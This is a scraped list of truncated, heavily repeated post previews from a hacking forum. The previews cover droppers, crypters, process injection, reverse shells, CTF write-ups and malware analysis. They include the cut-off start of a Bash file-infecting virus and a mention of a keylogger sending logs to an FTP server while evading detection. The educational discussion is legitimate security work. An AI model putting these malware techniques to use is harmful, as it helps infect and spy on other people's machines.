worked in lo&hellip;", "It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary", "It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary", "It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary", "A few months ago I wrote up a silly project to implement purely in memory SO (shared object) loading via the memfd_create syscall. I forgot to include y\u2019all in the fun and I am sorry . Sho\u2019 nuff\u2019 this is possible in just a few lines of python. I wrote it up as a class and it still is less than 20&hellip;", "ARM Crackme - Starting with EOR@Wunkolo and I have decided that there aren\u2019t enough ARM crackmes on the forum and that we should add a few for people that are interested in learning how the architecture works and for those that just want to show their skills  We will start very easy with some chal&hellip;", "Ok, so I\u2019ve solved it but I\u2019m not too sure how much information you actually want so I guess I will just split it into two spoiler tags  What does the binary want from me?A quick look into the binary tells you that it reads in 33 characters  (32 actual characters and the last one as a terminato&hellip;", "Regarding your specific question about virtual hardware (which may not be the best solution as pointed out in the comments above), you may take a look to this old post:", "Welcome to 0x00sec!  Knowing how to create undetectable payloads naturally requires you to understand how anti-virus software works so if you do not understand this then it\u2019s pretty hard to know what to do. I\u2019d highly recommend you do some reading on not only this but also on how the Windows operat&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "DISCLAIMER: Article originally published on immunIT. Hi fellas, Today, I will introduce you a new tool, developed for the sake of my penetration testing activities, named Drupwn which claims to provide a reliable and efficient way to perform enumerations on Drupal web applications. You may thin&hellip;", "I managed to open the 1.33 firmware file just fine in IDA Pro after reading the data-sheet and knowing where certain addresses should be mapped to. Here\u2019s the datasheet for the STM32F103 Check out the memory map of Section 4 to give you some insight on the address space so you\u2019ll know where to map&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "Hi! As for your big reverse engineering frameworks You can always check out the new IDA 7 free version which is quite limited in terms of functionality tho. Otherwise if you can spare a few bucks check out binaryninja. It\u2019s not yet on par with the paid IDA version but for your general CTF style E&hellip;", "Sorry, Windows is my playground so I\u2019ve no idea about Linux. You should direct your questions towards @0x00pf. As for Linux malware? Not sure if there\u2019s anything significant there?", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "@dtm @0x00pf Thank youu very much  I understand ^^", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "Thanks @dtm and @0x00pf \u2026 does it have any relation with having a  position independent in memory?", "In the Windows environment, using functions from libc (e.g. memcpy, strcpy) requires the msvcrt.dll library to be present in the process space which means that the binary must be linked with it in its import table assuming the source contains its direct usage (as opposed to dynamically retrieving it&hellip;", "It indeed makes things easier, if your program will be moving around in its own addressing space (or in another processes addressing space) and not just standing at the entry point specified in its ELF header (for GNU/Linux systems), then it is very handy to do not depend on anything external. To &hellip;", "In the Windows environment, using functions from libc (e.g. memcpy, strcpy) requires the msvcrt.dll library to be present in the process space which means that the binary must be linked with it in its import table assuming the source contains its direct usage (as opposed to dynamically retrieving it&hellip;", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "Thanks @dtm and @0x00pf \u2026 does it have any relation with having a  position independent in memory?", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "On top of @dtm points I\u2019d add: Your binary will be way smaller which is, in general, a desirable feature for a malwareI think point 2 is a very good reason", "The only reasons I can think of for implementing your own functions would be the following: Evading signature-based or heuristic detection.Let\u2019s say I have a keylogger and I want it to upload logs to my FTP server. If I directly link the executable such that functions like FtpOpenFile and FtpPut&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Hi @Bowlslaw Check section Understanding Paging in", "Hi @Bowlslaw Check section Understanding Paging in", "Hi @Bowlslaw Check section Understanding Paging in", "1- How to use outside my LAN ?I tried writing my public IP in the code and a port number but the client didn\u2019t connect. You\u2019ll need to forward the port, that you specified when you created the shell, back from your router to your localhost; this is, of course, assuming you\u2019re sitting behind a rou&hellip;", "@pry0cc, you really have to check this\u2026 code injection using ROP without ptrace from BASH! Do not underestimate the power of the shell!!", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Sure\u2026 that is exactly what this community is for", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "Sure\u2026 that is exactly what this community is for", "@0x00pf Thanks a lot for sharing. I read both articles and now I understand much more about how anonymize my scanning (and searching for more).  I\u2019m still learning, but maybe we can discuss more about some techniques and approaches in the future as I\u2019m testing and learning\u2026 if you don\u2019t mind.", "@0x00pf Thanks a lot for sharing. I read both articles and now I understand much more about how anonymize my scanning (and searching for more).  I\u2019m still learning, but maybe we can discuss more about some techniques and approaches in the future as I\u2019m testing and learning\u2026 if you don\u2019t mind.", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "For the LuLZ  This is a 17 LoC, multi-architecture virus (works on x86 -32/64bits-, ARM, MIPS, PowerPC,\u2026). It increases the infected binary in less than 350 bytes!!!. Feel the power of Bash! Best language ever for virus development!! #!/bin/bash#AMiINFECTEDfor f in *; do        if [ ! -z `fi&hellip;", "Userland API Monitoring and Code Injection DetectionAbout This PaperThe following document is a result of self-research of malicious software (malware) and its interaction with the Windows Application Programming Interface (WinAPI). It details the fundamental concepts behind how malware is able to&hellip;", "You have absolutely no idea. You don\u2019t come out of school as an \u201cengineer\u201d. Graduating from university does not make you an \u201cengineer\u201d. If anything, you know zero when you come out of school. Engineering comes from experience, it\u2019s applied science, it\u2019s practice, not theory.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Biomedical engineers. Agricultural engineers. [insert desired field] engineers.", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "For context, @Leeky was the highest scoring member on our CTF. He is probably the best pwner on this forum (excluding @exploit, @_py, @dtm  + @0x00pf) since they all were involved in CTF development.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "PrefaceHey there! I\u2019m finally ready to present you the third installment of the series exploit mitigation techniques. The last two times we talked about Data Execution Prevention and Stack Canaries Today I want to talk about Address Space Layout Randomization or ASLR in short. Format wise the a&hellip;", "For context, @Leeky was the highest scoring member on our CTF. He is probably the best pwner on this forum (excluding @exploit, @_py, @dtm  + @0x00pf) since they all were involved in CTF development.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "In Part I and Part II we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags. The sample we are going to analyse has a moderate complexity and a manual approach as we ha&hellip;", "Thanks, this helps me a lot.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Got &#39;em.  [image]", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Freestyle February: A 0x00sec Article ContestHello 0x00ers! The 0x00sec Staff is happy to announce our first annual Freestyle February! Here\u2019s how it works: Take up until the last day of February to research something technical, something from which the 0x00sec community might benefit. Then, po&hellip;", "This is amazing. This is what an awesome hacking community like this does. Good job everybody involved!", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new \u201cuser\u201d called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "I think I have done that a couple of times\u2026 You may be referring to this one:", "There will be a time when I finally pick up heap shenanigans and I will do all those challenges @_py! Promised", "Yup, that\u2019s the one.", "I think I have done that a couple of times\u2026 You may be referring to this one:", "Yup, that\u2019s the one.", "I think I have done that a couple of times\u2026 You may be referring to this one:", "If i\u2019m not mistaken, I believe @0x00pf did that at one point in the past 2 yrs.", "If i\u2019m not mistaken, I believe @0x00pf did that at one point in the past 2 yrs.", "Time to step up the game. Keep in mind there is more than one way to solve it. Good luck. RulesFeel free to pwn the binary on Ubuntu 16.04 or 17.04. Extra credits if you pwn it on 17.04. Don\u2019t ask me for hints. Hints will only be given 1 month after the challenge\u2019s release as long as there a&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Note: This is a repost from my personal blog GIF/Javascript Polyglots: Abusing GIFs, tags, and MIME types for evil6 minute read The backstoryRecently I saw a feature on a product I work on where we allowed hotlinking to arbitrary gifs without pulling them in, mangling, and then saving for our ow&hellip;", "PrefaceHey there! After quite some time the second part will be finally published  ! Sorry for the delay, real life can be overwhelming ;)\u2026 Last time I have introduced this series by covering Data Execution Prevention (DEP). Today we\u2019re dealing with the next big technique. As the title already&hellip;", "This is very interesting in fact, keep up the good work.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "IntroductionHello folks, I hope you\u2019re doing great! Today\u2019s topic will be once again heap exploitation related. In fact, we\u2019ll be going over the recent updates of glibc\u2019s heap allocator, (pt)malloc, which I\u2019ve researched/reversed lately and decided to present them to you since there is barely any i&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Ahh yea that makes sense. Ohh well I guess this gives me a reason to try and put something of my own together for it Thanks for the help", "Hi @0xff7 At first glance looks like your WT3020H uses a different SoC (MediaTek MT7620N). The GL-AR150, on the other hand has, apparently, the same SoC than the pineapple (Atheros AR9331), so I bet you cannot proceed as per the link you found. You can get the pineapple firmware and extract it (us&hellip;", "Hi @0xff7 At first glance looks like your WT3020H uses a different SoC (MediaTek MT7620N). The GL-AR150, on the other hand has, apparently, the same SoC than the pineapple (Atheros AR9331), so I bet you cannot proceed as per the link you found. You can get the pineapple firmware and extract it (us&hellip;", "Realmode Assembly - Writing bootable stuffPart 6: Let\u2019s write a small game (1/2)What is this?This is going to be a walk-through in writing an Operation System in assembly which operates purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal pr&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "This was incredibly helpful. Thank you very much!", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "READMEIf your antivirus detects this page as malicious, it is most probably because I have pasted some scripts into the article. Do not be alarmed! IntroductionVery recently I\u2019ve (finally) set up a proper malware analysis VM and so I thought that it would be super fun to download some samples fro&hellip;", "#Overview This is my Wiki that I\u2019ve gathered over the years. This is by no means complete and if some links are a repeat\u2026 please edit it at your leisure. Disclaimer: All content is at your own risk not mine. If you get arrested by the three-letter-organizations, don\u2019t come whining to me. #Books: &hellip;", "Thank you for sharing , great post", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "Thanks for the writeup @0x00pf! I spent quite a bit of time with that challenge but in the end I was stuck because I didn\u2019t know how to patch the ELF header and wasn\u2019t able to run it in gdb as a consequence (I found the environment variable checking code but failed at actually executing it with the&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "Thanks for the writeup @0x00pf! I spent quite a bit of time with that challenge but in the end I was stuck because I didn\u2019t know how to patch the ELF header and wasn\u2019t able to run it in gdb as a consequence (I found the environment variable checking code but failed at actually executing it with the&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Thanks for the writeup @0x00pf! The challenge was quite fun and easy to solve after spotting the ninja way  Can\u2019t wait for the next writeups!", "Thanks for the writeup @0x00pf! The challenge was quite fun and easy to solve after spotting the ninja way  Can\u2019t wait for the next writeups!", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Very neat and detailed writeup @0x00pf . Good job on this. I love it for a beginner/entry challenge, since it\u2019s not just plain reversing on easy mode, but essentially teaches you to understand and especially read the code carefully. If you can do this you can easily spot the ninja way  . If not y&hellip;", "Very neat and detailed writeup @0x00pf . Good job on this. I love it for a beginner/entry challenge, since it\u2019s not just plain reversing on easy mode, but essentially teaches you to understand and especially read the code carefully. If you can do this you can easily spot the ninja way  . If not y&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Shuffled Love (you need to register) was one of the Linux 64bits reverse challenges available to be solved during the recent 0x00Sec CTF Winter 2017 edition. This challenge was intended to be easy and at the end 42 persons were able to solve it. Before continuing, I\u2019d like to say that there are man&hellip;", "Hi 0x00\u2019ers, and all those that took part in 0x00ctf 2017! First off, we want to thank all of our challenge creators, admins, and participants. CTFs are a great opportunity for us as a community to sharpen our skills, challenge ourselves and each other with new problems, and meet new people who sha&hellip;", "Hi 0x00\u2019ers, and all those that took part in 0x00ctf 2017! First off, we want to thank all of our challenge creators, admins, and participants. CTFs are a great opportunity for us as a community to sharpen our skills, challenge ourselves and each other with new problems, and meet new people who sha&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "Hi @_py, Just for anyone that is following the thread. There is one single &quot;/bin/sh&quot; on my libc, otherwise, strings should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of ldd as libc_base (that is what didn\u2019t &hellip;", "I hope the winner will pay me a beer", "Hi @spoclate and thanks. You can find the solution here", "Hi. New to site. Love the challenge. Still trying to complete it. When will you post the code?", "Sure. I generate the image with a small program I wrote. I do not know if it is possible to generate the file just using a image processing tool. I will post the code later anyway a bit later today (I\u2019m finishing something else).", "PrefaceWelcome to a new series about GNU/Linux exploit mitigation techniques. We always had these awesome pwn and how2exploit articles. I wanna shift the focus to the bypassed techniques to create a series about  currently deployed approaches. Afterwards I\u2019d like to focus on their limitations wi&hellip;", "Either something is up with your system, or what\u2019s more likely is that there is more than one occurrence of /bin/sh and strings outputs the latter offset for some weird reason (?). PoC (x86_64 but doesn\u2019t matter): &gt;&gt; strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;18cd17 /bin/sh&hellip;", "Hi @_py, Just for anyone that is following the thread. There is one single &quot;/bin/sh&quot; on my libc, otherwise, strings should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of ldd as libc_base (that is what didn\u2019t &hellip;", "Hi @_py, Just for anyone that is following the thread. There is one single &quot;/bin/sh&quot; on my libc, otherwise, strings should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of ldd as libc_base (that is what didn\u2019t &hellip;", "Hi @WhiteCollar The system function actually executes /bin/sh -c command (see the man page). An sh: 1 something means that you have successfully called system but with the wrong parameter. Whatever follows the sh: 1 is what you have tried to execute\u2026 that may be non-printable garbage. Said that, a&hellip;", "Hi @_py, Just for anyone that is following the thread. There is one single &quot;/bin/sh&quot; on my libc, otherwise, strings should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of ldd as libc_base (that is what didn\u2019t &hellip;", "Hi @_py, Just for anyone that is following the thread. There is one single &quot;/bin/sh&quot; on my libc, otherwise, strings should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of ldd as libc_base (that is what didn\u2019t &hellip;", "Either something is up with your system, or what\u2019s more likely is that there is more than one occurrence of /bin/sh and strings outputs the latter offset for some weird reason (?). PoC (x86_64 but doesn\u2019t matter): &gt;&gt; strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;18cd17 /bin/sh&hellip;", "Slightly off-topic. But couldn\u2019t resist  Remember kids: If something doesn\u2019t work with the tools provided, built your own. keeps your scripting/programming  knowledge up2dateimplants used knowledge even deepercoolness factor+1Just fits perfectly 